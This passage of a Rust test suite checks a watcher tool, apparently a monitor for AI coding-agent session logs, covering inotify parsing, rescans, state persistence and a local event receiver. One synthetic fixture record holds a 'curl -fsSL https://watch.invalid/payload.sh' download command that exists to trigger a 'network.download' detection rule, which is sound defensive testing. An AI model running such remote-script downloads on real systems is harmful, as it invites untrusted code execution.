                inotify wd:2 ino:def sdev:fc00000 mask:2\n\
                inotify wd:3 ino:abc sdev:fb00000 mask:2\n\
                inotify wd:4 ino:bad sdev:invalid mask:2\n\
                inotify wd:5 ino:invalid sdev:fc00000 mask:2\n\
                inotify wd:6 ino:abc mask:2\n\
                inotify wd:7 sdev:fc00000 mask:2\n\
                inotify wd:invalid ino:abc sdev:fc00000 mask:2";
    let watched = inotify_directories(info);
    assert!(watched.contains(&(0xabc, 0xfc00000)));
    assert!(!watched.contains(&(0xdef, 0xfb00000)));
    assert!(!watched.contains(&(0xabc, 0xfd00000)));
    assert_eq!(watched.len(), 3);
    assert!(
        !inotify_directories("inotify wd:1 ino:abc sdev:fb00000").contains(&(0xabc, 0xfc00000))
    );
    assert!(
        !inotify_directories("inotify wd:1 ino:def sdev:fc00000").contains(&(0xabc, 0xfc00000))
    );
    assert!(inotify_directories("inotify wd:1 ino:abc\ninotify wd:2 sdev:fc00000").is_empty());
}

#[cfg(target_os = "linux")]
#[test]
fn watch_readiness_waits_for_nested_directory_registration() {
    use std::os::fd::FromRawFd;
    use std::os::unix::ffi::OsStrExt;

    let temp = tempdir().expect("tempdir");
    let ancestor = temp.path().join("codex");
    let target = ancestor.join("sessions/2026/04");
    fs::create_dir_all(&target).expect("create nested fixture directory");
    let fd = unsafe { libc::inotify_init1(libc::IN_CLOEXEC) };
    assert!(
        fd >= 0,
        "create inotify: {}",
        std::io::Error::last_os_error()
    );
    let fd = unsafe { std::os::fd::OwnedFd::from_raw_fd(fd) };
    let register = |directory: &Path| {
        let name =
            std::ffi::CString::new(directory.as_os_str().as_bytes()).expect("path without NUL");
        let wd = unsafe {
            libc::inotify_add_watch(
                std::os::fd::AsRawFd::as_raw_fd(&fd),
                name.as_ptr(),
                libc::IN_MODIFY,
            )
        };
        assert!(
            wd >= 0,
            "register directory: {}",
            std::io::Error::last_os_error()
        );
    };
    register(&ancestor);
    let expected = inotify_directory_identity(&target);
    let ancestor_only =
        observed_inotify_directories(std::process::id()).expect("inspect ancestor watch");
    assert!(!ancestor_only.is_empty());
    assert!(!ancestor_only.contains(&expected));
    register(&target);
    let with_target =
        observed_inotify_directories(std::process::id()).expect("inspect target watch");
    assert!(
        with_target.contains(&expected),
        "expected {expected:x?}, observed {with_target:x?}"
    );
}

#[cfg(unix)]
#[test]
fn watch_sigterm_readiness_requires_completed_source_scan() {
    assert!(!is_sigterm_watch_summary("not JSON"));
    assert!(!is_sigterm_watch_summary(
        r#"{"event_type":"activity","source_processing":{"parsed_record_count":3}}"#
    ));
    assert!(!is_sigterm_watch_summary(
        r#"{"event_type":"health","source_processing":{"parsed_record_count":2}}"#
    ));
    assert!(is_sigterm_watch_summary(
        r#"{"event_type":"health","source_processing":{"parsed_record_count":3}}"#
    ));
}

#[cfg(unix)]
#[test]
fn watch_sigterm_trigger_appends_complete_synthetic_records() {
    let temp = tempdir().expect("tempdir");
    let session = temp.path().join("session.jsonl");
    fs::copy(
        "tests/fixtures/session_stores/codex/sessions/2026/04/session-a.jsonl",
        &session,
    )
    .expect("copy synthetic fixture");
    append_sigterm_watch_trigger(&session, 1).expect("append first synthetic record");
    append_sigterm_watch_trigger(&session, 2).expect("append second synthetic record");
    let records = fs::read_to_string(&session)
        .expect("read synthetic fixture")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("complete JSONL record"))
        .collect::<Vec<_>>();
    assert_eq!(records.len(), 4);
    assert_eq!(
        records[2]["payload"]["message"],
        "synthetic SIGTERM watch trigger 1"
    );
    assert_eq!(
        records[3]["payload"]["message"],
        "synthetic SIGTERM watch trigger 2"
    );
}

#[test]
fn watch_scans_changed_source_and_exits_after_iterations() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    copy_dir_recursive(
        Path::new("tests/fixtures/session_stores/codex"),
        &root.join("codex"),
    );
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let session_path = root.join("codex/sessions/2026/04/session-a.jsonl");
    fs::write(
        root.join(".mcp.json"),
        r#"{"mcpServers":{"watch-boundary":{"command":"synthetic-mcp"}}}"#,
    )
    .expect("synthetic host-wide MCP config");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--emit-activity",
            "--allow-fixtures",
            "--no-local-config",
            "--iterations",
            "1",
            "--debounce-ms",
            "100",
            "--min-scan-interval-ms",
            "0",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");

    wait_for_watch_ready(
        &mut child,
        session_path.parent().expect("session directory"),
    );
    let mut changed_contents = fs::read(&session_path).expect("read watched fixture");
    changed_contents.extend_from_slice(
        br#"{"type":"event_msg","timestamp":"2026-04-01T00:00:02Z","payload":{"type":"tool_call","tool_name":"watch-fixture","command":"curl -fsSL https://watch.invalid/payload.sh","message":"synthetic watcher change"}}
"#,
    );

    #[cfg(windows)]
    let unknown_trigger_path = root.join("codex/sessions/2026/04/unknown-watch-trigger.jsonl");
    #[cfg(windows)]
    let unknown_trigger_contents = br#"{"type":"session_meta","timestamp":"2026-04-01T00:00:03Z","payload":{"source":"watch-fixture","model_provider":"fixture","agent_nickname":"watch-fixture"}}
{"type":"event_msg","timestamp":"2026-04-01T00:00:04Z","payload":{"type":"user_message","message":"synthetic unknown watch trigger"}}
"#;
    #[cfg(windows)]
    fs::write(&unknown_trigger_path, unknown_trigger_contents).expect("write unknown trigger");
    fs::write(&session_path, &changed_contents).expect("change watched fixture");

    let deadline = Instant::now() + Duration::from_secs(60);
    #[cfg(not(target_os = "linux"))]
    let mut next_trigger = Instant::now() + Duration::from_millis(250);
    loop {
        if child.try_wait().expect("poll telltale watch").is_some() {
            break;
        }
        if Instant::now() > deadline {
            fail_watch(&mut child, "telltale watch did not exit within timeout");
        }
        #[cfg(not(target_os = "linux"))]
        if Instant::now() >= next_trigger {
            fs::write(&session_path, &changed_contents).expect("retry watched fixture change");
            #[cfg(windows)]
            fs::write(&unknown_trigger_path, unknown_trigger_contents)
                .expect("retry unknown trigger");
            next_trigger = Instant::now() + Duration::from_millis(250);
        }
        thread::sleep(Duration::from_millis(50));
    }

    let output = child
        .wait_with_output()
        .expect("collect telltale watch output");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let summary_line = stdout
        .lines()
        .find(|line| line.starts_with('{'))
        .expect("watch scan summary line");
    let summary: Value = serde_json::from_str(summary_line).expect("scan summary json");
    assert_eq!(summary["event_type"], "health");
    assert_runtime_snapshot(&summary);
    assert!(
        summary["source_processing"]["parsed_record_count"]
            .as_u64()
            .expect("parsed record count")
            >= 3
    );
    let events = fs::read_to_string(&log_path)
        .expect("watch event log")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("watch event json"))
        .collect::<Vec<_>>();
    assert!(
        events
            .iter()
            .any(|event| { event["event_type"] == "activity" && event["client"] == "codex" })
    );
    let has_mcp_inventory = events.iter().any(|event| {
        event["session_id"] == "mcp_inventory" && event["tool_name"] == "mcp::watch-boundary"
    });
    // The Windows trigger forces a full scan; other platforms target the
    // known changed source and must not walk host-wide MCP configuration.
    assert_eq!(has_mcp_inventory, cfg!(windows));
    let changed_detection = events
        .iter()
        .find(|event| {
            event["event_type"] == "detection"
                && event["rule_ids"]
                    .as_array()
                    .expect("rule ids")
                    .iter()
                    .any(|rule| rule == "network.download")
        })
        .expect("network.download detection");
    assert!(
        changed_detection["source_path_hash"].as_str().is_some_and(
            |hash| hash.len() == 64 && hash.bytes().all(|byte| byte.is_ascii_hexdigit())
        )
    );
    #[cfg(not(windows))]
    assert_eq!(
        summary["source_discovery"]["basis"],
        "watch_source_index_snapshot"
    );
    #[cfg(not(windows))]
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        false
    );
    #[cfg(windows)]
    assert_eq!(summary["source_discovery"]["basis"], "current_full_scan");
    #[cfg(windows)]
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert!(
        summary["source_discovery"]["operational_source_count"]
            .as_u64()
            .unwrap()
            >= summary["source_processing"]["selected_source_count"]
                .as_u64()
                .unwrap()
    );
    assert_eq!(
        summary["effective_configuration"]["local_config"]["mode"],
        "disabled"
    );
    assert!(
        log_path.exists(),
        "watch scan should write events to the log path"
    );
    assert!(
        state_path.exists(),
        "watch scan should persist scanner state"
    );
}

#[test]
fn watch_skips_no_op_state_save() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    let session_dir = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&session_dir).expect("create Codex session directory");
    fs::copy(
        "tests/fixtures/session_stores/codex/sessions/2026/04/session-a.jsonl",
        session_dir.join("session-a.jsonl"),
    )
    .expect("copy Codex session fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--allow-fixtures",
            "--no-local-config",
            "--iterations",
            "2",
            "--debounce-ms",
            "100",
            "--min-scan-interval-ms",
            "0",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");
    let stdout = child.stdout.take().expect("watch stdout");
    let (summary_tx, summary_rx) = mpsc::channel();
    thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if summary_tx.send(line).is_err() {
                break;
            }
        }
    });

    // Allow the watcher to finish initialization, then issue exactly one
    // unrelated change. An unknown path forces a full reconciliation, and
    // waiting for its summary prevents that first trigger from accidentally
    // satisfying the second iteration.
    wait_for_watch_ready(&mut child, &root.join("codex/sessions"));
    let first_trigger = root.join("codex/sessions/first-trigger.txt");
    #[cfg(target_os = "linux")]
    let first_attempt = 1;
    #[cfg(not(target_os = "linux"))]
    let mut first_attempt = 1;
    fs::write(
        &first_trigger,
        format!("watch first trigger {first_attempt}\n"),
    )
    .expect("write first trigger");
    #[cfg(not(target_os = "linux"))]
    let mut next_retry = Instant::now() + Duration::from_secs(5);
    let first_deadline = Instant::now() + Duration::from_secs(60);
    let first_summary = loop {
        match summary_rx.recv_timeout(Duration::from_millis(100)) {
            Ok(line) => break line,
            Err(mpsc::RecvTimeoutError::Timeout) => {}
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                panic!("watch summary reader disconnected before first scan completed")
            }
        }
        if let Some(status) = child.try_wait().expect("poll telltale watch") {
            panic!("telltale watch exited before first scan completed: {status:?}");
        }
        if Instant::now() >= first_deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not complete the first triggered scan within timeout");
        }
        #[cfg(not(target_os = "linux"))]
        if Instant::now() >= next_retry {
            first_attempt += 1;
            fs::write(
                &first_trigger,
                format!("watch first trigger {first_attempt}\n"),
            )
            .expect("retry first trigger");
            next_retry = Instant::now() + Duration::from_secs(5);
        }
    };

    let state_before = fs::read(&state_path).expect("read first state snapshot");
    let mtime_before = fs::metadata(&state_path)
        .expect("state metadata")
        .modified()
        .expect("state mtime");

    // Trigger a full reconciliation with an unrelated path. No new records
    // means no emitted events and no durable state changes, so the state-save
    // should be skipped.
    let noop_trigger = root.join("codex/sessions/noop-trigger.txt");
    fs::write(&noop_trigger, b"watch test trigger\n").expect("write no-op trigger");

    // Wait for the second iteration to finish and the process to exit.
    let deadline = Instant::now() + Duration::from_secs(60);
    loop {
        if child.try_wait().expect("poll telltale watch").is_some() {
            break;
        }
        if Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not exit after second scan within timeout");
        }
        thread::sleep(Duration::from_millis(100));
    }

    let output = child
        .wait_with_output()
        .expect("collect telltale watch output");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let mut summaries =
        vec![serde_json::from_str::<Value>(&first_summary).expect("first watch summary json")];
    summaries.extend(
        summary_rx
            .iter()
            .map(|line| serde_json::from_str::<Value>(&line).expect("watch summary json")),
    );
    assert_eq!(summaries.len(), 2);
    assert_runtime_snapshot(&summaries[0]);
    assert_eq!(summaries[0]["runtime"], summaries[1]["runtime"]);
    assert_eq!(
        summaries[0]["effective_configuration"],
        summaries[1]["effective_configuration"]
    );
    assert_eq!(
        summaries[0]["source_discovery"]["basis"],
        "current_full_scan"
    );
    assert_eq!(
        summaries[0]["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert_eq!(
        summaries[1]["source_discovery"]["basis"],
        "current_full_scan"
    );

    let state_after = fs::read(&state_path).expect("read second state snapshot");
    let mtime_after = fs::metadata(&state_path)
        .expect("state metadata")
        .modified()
        .expect("state mtime");
    assert_eq!(
        state_before, state_after,
        "no-op watch scan should not rewrite state bytes"
    );
    assert_eq!(
        mtime_before, mtime_after,
        "no-op watch scan should not rewrite state file"
    );
}

#[cfg(target_os = "linux")]
struct WatchChildGuard {
    child: Option<std::process::Child>,
}

#[cfg(target_os = "linux")]
impl WatchChildGuard {
    fn new(child: std::process::Child) -> Self {
        Self { child: Some(child) }
    }

    fn id(&self) -> u32 {
        self.child.as_ref().expect("watch child guard").id()
    }

    fn child_mut(&mut self) -> &mut std::process::Child {
        self.child.as_mut().expect("watch child guard")
    }

    fn disarm(mut self) -> std::process::Child {
        self.child.take().expect("watch child guard")
    }
}

#[cfg(target_os = "linux")]
impl Drop for WatchChildGuard {
    fn drop(&mut self) {
        if let Some(child) = self.child.as_mut() {
            if child.try_wait().ok().flatten().is_none() {
                let _ = child.kill();
            }
            let _ = child.wait();
        }
    }
}

// File-backed process output avoids pipe backpressure and reader threads on
// panic. All waits have deadlines; WatchChildGuard kills and reaps on unwind.
#[cfg(target_os = "linux")]
mod sustained_process {
    use super::*;

    pub(super) struct Process {
        child: WatchChildGuard,
        stdout: std::path::PathBuf,
        stderr: std::path::PathBuf,
        output: BufReader<fs::File>,
        partial: Vec<u8>,
    }

    impl Process {
        pub(super) fn watch(command: &mut Command, directory: &Path, name: &str) -> Self {
            let stdout = directory.join(format!("{name}.stdout"));
            let stderr = directory.join(format!("{name}.stderr"));
            let child = WatchChildGuard::new(
                command
                    .stdout(fs::File::create(&stdout).unwrap())
                    .stderr(fs::File::create(&stderr).unwrap())
                    .spawn()
                    .unwrap(),
            );
            Self {
                child,
                output: BufReader::new(fs::File::open(&stdout).unwrap()),
                partial: Vec::new(),
                stdout,
                stderr,
            }
        }

        pub(super) fn id(&self) -> u32 {
            self.child.id()
        }

        fn diagnostic(&self) -> String {
            use std::io::{Seek, SeekFrom};
            let mut file = fs::File::open(&self.stderr).unwrap();
            let length = file.metadata().unwrap().len();
            file.seek(SeekFrom::Start(length.saturating_sub(65536)))
                .unwrap();
            let mut bytes = Vec::new();
            file.take(65536).read_to_end(&mut bytes).unwrap();
            String::from_utf8_lossy(&bytes).into_owned()
        }

        pub(super) fn ready(&mut self, sessions: &Path) {
            wait_for_watch_ready(self.child.child_mut(), sessions);
        }

        fn line(&mut self) -> Option<String> {
            // EOF is temporary for a growing file. Keep only one bounded partial
            // record, resuming at the reader's offset when the writer appends.
            let remaining = (1024 * 1024 + 1 - self.partial.len()) as u64;
            self.output
                .by_ref()
                .take(remaining)
                .read_until(b'\n', &mut self.partial)
                .unwrap();
            assert!(self.partial.len() <= 1024 * 1024, "stdout record bound");
            if self.partial.last() == Some(&b'\n') {
                Some(String::from_utf8(std::mem::take(&mut self.partial)).unwrap())
            } else {
                None
            }
        }

        pub(super) fn before_write(&mut self) {
            // Peek without consuming: even an incomplete late summary makes
            // the next write-to-health pairing ambiguous.
            assert!(
                self.partial.is_empty() && self.output.fill_buf().unwrap().is_empty(),
                "stale stdout before source write"
            );
        }

        pub(super) fn health(&mut self, deadline: Instant) -> Value {
            loop {
                if let Some(line) = self.line() {
                    let summary: Value = serde_json::from_str(&line).unwrap();
                    assert_eq!(summary["event_type"], "health");
                    return summary;
                }
                assert!(
                    self.child.child_mut().try_wait().unwrap().is_none(),
                    "watch exited: {}",
                    self.diagnostic()
                );
                assert!(
                    Instant::now() < deadline,
                    "health deadline: {}",
                    self.diagnostic()
                );
                thread::sleep(Duration::from_millis(5));
            }
        }

        pub(super) fn quiet(&mut self) {
            let deadline = Instant::now() + Duration::from_millis(250);
            loop {
                assert!(self.line().is_none(), "extra health during settling");
                assert!(
                    self.child.child_mut().try_wait().unwrap().is_none(),
                    "watch exited during settling"
                );
                if Instant::now() >= deadline {
                    break;
                }
                thread::sleep(Duration::from_millis(5));
            }
        }

        pub(super) fn terminate(mut self) {
            assert_eq!(
                unsafe { libc::kill(self.id() as libc::pid_t, libc::SIGTERM) },
                0
            );
            let deadline = Instant::now() + Duration::from_secs(15);
            loop {
                if let Some(status) = self.child.child_mut().try_wait().unwrap() {
                    assert!(status.success(), "TERM failed: {}", self.diagnostic());
                    break;
                }
                assert!(Instant::now() < deadline, "TERM deadline");
                thread::sleep(Duration::from_millis(10));
            }
        }

        pub(super) fn rejected(mut self, dimension: &str) -> String {
            let deadline = Instant::now() + Duration::from_secs(20);
            loop {
                if let Some(status) = self.child.child_mut().try_wait().unwrap() {
                    let error = self.diagnostic();
                    assert!(!status.success(), "capacity overflow succeeded");
                    assert!(
                        error.contains(dimension),
                        "not {dimension} capacity rejection: {error}"
                    );
                    assert!(
                        self.line().is_none(),
                        "rejection produced a successful health summary"
                    );
                    return error;
                }
                assert!(Instant::now() < deadline, "capacity rejection deadline");
                thread::sleep(Duration::from_millis(5));
            }
        }

        fn completed_json(mut self) -> Value {
            let deadline = Instant::now() + Duration::from_secs(20);
            loop {
                if let Some(status) = self.child.child_mut().try_wait().unwrap() {
                    assert!(status.success(), "status failed: {}", self.diagnostic());
                    assert!(fs::metadata(&self.stdout).unwrap().len() <= 1024 * 1024);
                    return serde_json::from_slice(&fs::read(&self.stdout).unwrap()).unwrap();
                }
                assert!(Instant::now() < deadline, "status deadline");
                thread::sleep(Duration::from_millis(5));
            }
        }
    }

    pub(super) fn command(home: &Path, root: &Path, state: &Path) -> Command {
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .env_clear()
            .env("HOME", home)
            .args([
                "watch",
                "--allow-fixtures",
                "--client",
                "codex",
                "--install-inventory-disabled",
                "--debounce-ms",
                "100",
                "--min-scan-interval-ms",
                "0",
                "--root",
            ])
            .arg(root)
            .arg("--state-path")
            .arg(state);
        command
    }

    #[test]
    fn process_output_incremental_large_file_and_partial_eof() {
        let directory = tempdir().unwrap();
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command.env_clear().arg("--version");
        let mut process = Process::watch(&mut command, directory.path(), "incremental");
        let deadline = Instant::now() + Duration::from_secs(10);
        while process.child.child_mut().try_wait().unwrap().is_none() {
            assert!(Instant::now() < deadline);
            thread::sleep(Duration::from_millis(5));
        }
        fs::write(&process.stdout, b"").unwrap();
        let mut writer = fs::OpenOptions::new()
            .append(true)
            .open(&process.stdout)
            .unwrap();
        for index in 0..1100 {
            let line = format!("{index}:{}\n", "x".repeat(1024));
            writer.write_all(line.as_bytes()).unwrap();
            assert_eq!(process.line().unwrap(), line);
            assert!(process.line().is_none());
        }
        assert!(fs::metadata(&process.stdout).unwrap().len() > 1024 * 1024);
        writer.write_all(b"partial").unwrap();
        assert!(process.line().is_none());
        assert!(process.line().is_none());
        writer.write_all(b"-tail\nextra\n").unwrap();
        assert_eq!(process.line().unwrap(), "partial-tail\n");
        assert_eq!(process.line().unwrap(), "extra\n");
        assert!(process.line().is_none());
        process.before_write();
        writer.write_all(b"{\"event_type\":\"health\"}\n").unwrap();
        assert!(
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| process.before_write()))
                .is_err()
        );
        assert_eq!(
            process.line().unwrap(),
            "{\"event_type\":\"health\"}\n",
            "prewrite check discarded stale complete record"
        );
        process.before_write();
        writer.write_all(b"{\"event_type\":").unwrap();
        assert!(
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| process.before_write()))
                .is_err()
        );
        assert!(process.line().is_none());
        assert!(
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| process.before_write()))
                .is_err()
        );
        writer.write_all(b"\"health\"}\n").unwrap();
        assert_eq!(
            process.line().unwrap(),
            "{\"event_type\":\"health\"}\n",
            "prewrite check discarded stale partial record"
        );
        process.before_write();
    }

    pub(super) fn report_directory() {
        let directory = std::env::var_os("TELLTALE_WORKLOAD_REPORT_DIR")
            .expect("set TELLTALE_WORKLOAD_REPORT_DIR for process measurements");
        let directory = Path::new(&directory);
        fs::create_dir_all(directory).unwrap();
    }

    pub(super) fn collections(state: &Path) -> Value {
        let value: Value = serde_json::from_slice(&fs::read(state).unwrap()).unwrap();
        Value::Object(
            value
                .as_object()
                .unwrap()
                .iter()
                .filter_map(|(key, value)| {
                    let count = match value {
                        Value::Object(v) => v.len(),
                        Value::Array(v) => v.len(),
                        _ => return None,
                    };
                    Some((key.clone(), Value::from(count)))
                })
                .collect(),
        )
    }

    pub(super) fn journal(log: &Path) -> Value {
        let stem = log.file_stem().unwrap().to_str().unwrap();
        let paths = fs::read_dir(log.parent().unwrap())
            .unwrap()
            .map(|e| e.unwrap().path())
            .filter(|p| {
                p.extension().is_some_and(|e| e == "jsonl")
                    && p.file_stem().unwrap().to_str().unwrap().starts_with(stem)
            })
            .collect::<Vec<_>>();
        let mut bytes = 0;
        let mut events = 0;
        for path in &paths {
            let content = fs::read(path).unwrap();
            bytes += content.len();
            for line in content
                .split(|b| *b == b'\n')
                .filter(|line| !line.is_empty())
            {
                let _: Value = serde_json::from_slice(line).unwrap();
                events += 1;
            }
        }
        serde_json::json!({"file_count": paths.len(), "event_count": events, "bytes": bytes})
    }

    pub(super) fn positive(phase: u8) -> Vec<u8> {
        include_str!("../fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl")
            .replace(
                "repo_status",
                if phase == 0 {
                    "repo_statua"
                } else {
                    "repo_statub"
                },
            )
            .into_bytes()
    }

    #[derive(Clone, Copy)]
    pub(super) enum ResponseMode {
        Prompt,
        Delayed,
        Timeout,
    }

    impl ResponseMode {
        pub(super) fn delay(self, restored: bool) -> Duration {
            Duration::from_millis(match self {
                Self::Prompt => 0,
                Self::Delayed => 750,
                Self::Timeout if !restored => 1500,
                Self::Timeout => 0,
            })
        }
        pub(super) fn timeout_ms(self) -> u64 {
            if matches!(self, Self::Timeout) {
                500
            } else {
                2000
            }
        }
    }

    pub(super) struct Receiver {
        pub(super) address: std::net::SocketAddr,
        pub(super) available: std::sync::Arc<std::sync::atomic::AtomicBool>,
        stop: std::sync::Arc<std::sync::atomic::AtomicBool>,
        pub(super) requests: std::sync::Arc<std::sync::Mutex<Vec<Value>>>,
        reader: Option<thread::JoinHandle<()>>,
    }

    impl Receiver {
        pub(super) fn new(mode: ResponseMode) -> Self {
            use std::sync::{
                Arc, Mutex,
                atomic::{AtomicBool, Ordering},
            };
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let address = listener.local_addr().unwrap();
            listener.set_nonblocking(true).unwrap();
            let available = Arc::new(AtomicBool::new(false));
            let stop = Arc::new(AtomicBool::new(false));
            let requests = Arc::new(Mutex::new(Vec::new()));
            let (worker_available, worker_stop, worker_requests) =
                (available.clone(), stop.clone(), requests.clone());
            let epoch = Instant::now();
            let reader = thread::spawn(move || {
                while !worker_stop.load(Ordering::SeqCst) {
                    match listener.accept() {
                        Ok((mut stream, _)) => {
                            let received = Instant::now();
                            stream
                                .set_read_timeout(Some(Duration::from_secs(2)))
                                .unwrap();
                            stream
                                .set_write_timeout(Some(Duration::from_secs(2)))
                                .unwrap();
                            let mut reader = BufReader::new(stream.try_clone().unwrap());
                            let mut length = None;
                            let mut header_bytes = 0;
                            loop {
                                let mut line = String::new();
                                // Bounded bytes and EOF handling, including on test unwind.
                                let read = reader.by_ref().take(8192).read_line(&mut line).unwrap();
                                assert!(read > 0, "receiver header EOF");
                                header_bytes += read;
                                assert!(header_bytes <= 32768, "receiver header bound");
                                if line == "\r\n" {
                                    break;
                                }
                                if let Some((name, value)) = line.split_once(':')
                                    && name.eq_ignore_ascii_case("content-length")
                                {
                                    length = Some(value.trim().parse::<usize>().unwrap());
                                }
                            }
                            let length = length.expect("HEC content length");
                            assert!(length <= 1024 * 1024, "receiver body bound");
                            let mut bytes = vec![0; length];
                            reader.read_exact(&mut bytes).unwrap();
                            let body: Value = serde_json::from_slice(&bytes).unwrap();
                            let id = body["event"]["event_id"].as_str().unwrap();
                            let restored = worker_available.load(Ordering::SeqCst);
                            let status = if restored { 200 } else { 503 };
                            let index = {
                                let mut requests = worker_requests.lock().unwrap();
                                assert!(requests.len() < 1024, "receiver observation bound");
                                let index = requests.len();
                                requests.push(serde_json::json!({
                                    "event_id":id,"event":body["event"], "status":status,
                                    "received_unix_ms":std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as u64,
                                    "received_since_start_ms":received.duration_since(epoch).as_secs_f64()*1000.0,
                                    "request_to_response_ms":Value::Null,"response_write_completed":false,
                                    "wire_body_sha256":format!("{:x}",sha2::Sha256::digest(&bytes)),
                                    "hash_scope":"wire HEC envelope bytes, NOT canonical raw Event bytes",
                                }));
                                index
                            };
                            let until = Instant::now() + mode.delay(restored);
                            while Instant::now() < until && !worker_stop.load(Ordering::SeqCst) {
                                thread::sleep(Duration::from_millis(5));
                            }
                            if worker_stop.load(Ordering::SeqCst) {
                                break;
                            }
                            let result = write!(
                                stream,
                                "HTTP/1.1 {status} Synthetic\r\nRetry-After: 2\r\nContent-Length: 10\r\nConnection: close\r\n\r\n{{\"code\":0}}"
                            );
                            if !matches!(mode, ResponseMode::Timeout) {
                                result.as_ref().unwrap();
                            }
                            let mut requests = worker_requests.lock().unwrap();
                            requests[index]["request_to_response_ms"] =
                                Value::from(received.elapsed().as_secs_f64() * 1000.0);
                            requests[index]["response_write_completed"] =
                                Value::from(result.is_ok());
                            requests[index]["client_result"] = Value::from(
                                if matches!(mode, ResponseMode::Timeout) && !restored {
                                    "configured timeout; server write is not client completion"
                                } else {
                                    "client completion independently observed in outbox"
                                },
                            );
                        }
                        Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                            thread::sleep(Duration::from_millis(5))
                        }
                        Err(error) => panic!("synthetic accept: {error}"),
                    }
                }
            });
            Self {
                address,
                available,
                stop,
                requests,
                reader: Some(reader),
            }
        }

        pub(super) fn finish(mut self) -> Vec<Value> {
            self.stop.store(true, std::sync::atomic::Ordering::SeqCst);
            self.reader.take().unwrap().join().expect("receiver reader");
            self.requests.lock().unwrap().clone()
        }
    }

    impl Drop for Receiver {
        fn drop(&mut self) {
            self.stop.store(true, std::sync::atomic::Ordering::SeqCst);
            if let Some(reader) = self.reader.take() {
                // Socket operations time out, so a panic cannot strand a reader.
                let _ = reader.join();
            }
        }
    }

    pub(super) fn outbox(path: &Path) -> Value {
        let mut connection =
            Connection::open_with_flags(path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
        connection.busy_timeout(Duration::from_secs(2)).unwrap();
        let db = connection.transaction().unwrap();
        let mut groups = serde_json::Map::new();
        for state in ["pending", "blocked", "acked", "dead"] {
            let (rows, bytes): (u64, u64) = db.query_row(
                "SELECT COUNT(*), COALESCE(SUM(length(e.payload)),0) FROM deliveries d JOIN events e USING(event_id) WHERE d.state=?1",
                [state], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
            groups.insert(
                state.to_owned(),
                serde_json::json!({"rows":rows,"payload_bytes":bytes}),
            );
        }
        let identities = db
            .prepare(
                "SELECT event_id, payload_hash, payload FROM events ORDER BY event_id",
            )
            .unwrap()
            .query_map([], |r| {
                Ok((
                    r.get::<_, String>(0)?,
                    r.get::<_, Vec<u8>>(1)?,
                    r.get::<_, Vec<u8>>(2)?,
                ))
            })
            .unwrap()
            .map(|row| {
                let (id, hash, payload) = row.unwrap();
                let computed = sha2::Sha256::digest(&payload);
                assert_eq!(hash.as_slice(), computed.as_slice(), "canonical payload hash mismatch");
                (
                    id,
                    serde_json::json!({"canonical_payload_sha256":format!("{computed:x}"),"payload_bytes":payload.len(),"event":serde_json::from_slice::<Value>(&payload).unwrap()}),
                )
            })
            .collect::<serde_json::Map<_, _>>();
        let retry_rows = db.prepare("SELECT event_id, attempt_count, next_attempt_at, last_error_class, updated_at FROM deliveries ORDER BY event_id, sink_id").unwrap()
            .query_map([], |r| Ok(serde_json::json!({"event_id":r.get::<_,String>(0)?,"attempt_count":r.get::<_,u64>(1)?,"next_attempt_at":r.get::<_,Option<u64>>(2)?,"last_error_class":r.get::<_,Option<String>>(3)?,"updated_at":r.get::<_,u64>(4)?}))).unwrap()
            .map(Result::unwrap).collect::<Vec<_>>();
        let sink_errors = db.prepare("SELECT sink_id, last_error_at, last_error_class FROM sink_health ORDER BY sink_id").unwrap()
            .query_map([], |r| Ok(serde_json::json!({"sink_id":r.get::<_,String>(0)?,"last_error_at":r.get::<_,Option<u64>>(1)?,"last_error_class":r.get::<_,Option<String>>(2)?}))).unwrap()
            .map(Result::unwrap).collect::<Vec<_>>();
        let (events, payload_bytes): (u64, u64) = db
            .query_row(
                "SELECT COUNT(*), COALESCE(SUM(length(payload)),0) FROM events",
                [],
                |r| Ok((r.get(0)?, r.get(1)?)),
            )
            .unwrap();
